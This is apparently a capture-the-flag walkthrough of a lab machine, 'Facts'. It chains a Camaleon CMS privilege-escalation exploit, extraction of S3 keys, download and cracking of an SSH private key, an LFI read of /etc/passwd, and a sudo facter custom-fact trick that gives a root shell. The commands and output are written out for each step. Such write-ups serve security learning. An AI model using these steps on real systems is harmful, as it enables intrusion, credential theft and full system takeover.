# Room: Facts
Difficulty: Easy

## Recon

First thing first when doing pentesting is to scan the network to find open ports using:

``` bash
nmap -sC -sV TARGETIP
```
Result:
``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
To be able to view the website, I added facts.htb to my /etc/hosts.
``` bash
echo "TARGET_IP facts.htb" | sudo tee -a /etc/hosts
```
## Enumeration

I started fuzzing for directories and I found /admin. I created an account and found that the server uses Camaleon CMS version 2.9.0.

Doing my research, I found that it was released on January 6, 2026, and it is vulnerable to CVE‑2025‑2304 (Privilege Escalation).

I found this payload:

https://github.com/Alien0ne/CVE-2025-2304/blob/main/README.md

It allows authenticated low‑privileged users to escalate to administrative status.

``` bash
python3 facts.py -u http://facts.htb -U gotham -P gotham -e -r
```
Result:
``` bash
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 5
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: AKIADBA654C38B09A079
   s3 secret key: SFvsHydtkoZX9+77jtknKWDQ4tIMqmClai8PYf1U
   s3 endpoint: http://localhost:54321
[+]Reverting User Role
   User ID: 5
   User Role: client
```
## Accessing AWS S3 Storage

After getting the AWS S3 access key and AWS S3 secret key, I used the following commands.
``` bash
aws --endpoint-url http://facts.htb:54321 s3 ls
```
Result: 
``` bash
2025-09-11 20:06:52 internal
2025-09-11 20:06:52 randomfacts
```
``` bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal
```
Result: 
``` bash
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-09 02:45:13        220 .bash_logout
2026-01-09 02:45:13       3900 .bashrc
2026-01-09 02:47:17         20 .lesshst
2026-01-09 02:47:17        807 .profile
```
``` bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
```
Result:
``` bash
2026-03-16 21:22:55         82 authorized_keys
2026-03-16 21:22:55        464 id_ed25519
```
Download the id_ed25519
``` bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
```
## Cracking the SSH Key

Now I cracked the password using john, and it returned:
### dragonballz

My next problem was identifying which user this password belongs to.

I did my research again and found an LFI vulnerability. I used this exploit:
https://github.com/Goultarde/CVE-2024-46987/blob/main/README.md

## Exploiting LFI
``` python
python3 CVE-2024-46987.py \
-u http://facts.htb \
-l admin \
-p admin \
--path /admin/media/download_private_file \
/etc/passwd
```
Result:
``` bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```
## Initial Access

I tried using the password with the user trivia, and I successfully logged in.

Now I obtained the user flag from william’s directory.

Privilege Escalation

I ran the following command:
``` bash
sudo -l
```
Result:
``` bash
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
## Facter Exploitation

I created a directory and a malicious Ruby fact file.

``` bash
mkdir /tmp/facts
nano /tmp/facts/pwn.rb
```
Inside pwn.rb:
``` bash
exec "/bin/sh"
```
Then executed it:
``` bash
sudo /usr/bin/facter --custom-dir /tmp/facts pwn
```
Now I am root 
